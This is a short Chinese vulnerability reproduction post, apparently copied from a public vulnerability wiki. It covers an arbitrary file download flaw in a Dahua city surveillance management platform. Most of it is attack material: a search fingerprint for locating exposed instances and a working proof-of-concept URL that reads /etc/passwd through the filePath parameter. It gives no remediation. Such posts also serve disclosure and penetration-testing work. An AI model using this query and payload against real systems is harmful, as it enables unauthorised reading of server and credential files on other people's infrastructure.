---
title: "大华 城市安防监控系统平台管理 attachment_downloadByUrlAtt.action 任意文件下载漏洞"
date: 2026-10-18 09:15:58
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "大华"
tags:
  - "大华"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

大华城市安防监控系统平台管理存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

大华城市安防监控系统平台管理

## 网络测绘

```
"attachment_downloadByUrlAtt.action"
```

## 漏洞复现

登录页面

![image-20230704113653161](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230704113653161.png)

验证POC

```
/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
```

![image-20230704113705975](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230704113705975.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%A4%A7%E5%8D%8E-%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0%E7%AE%A1%E7%90%86-attachment_downloadByUrlAtt.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
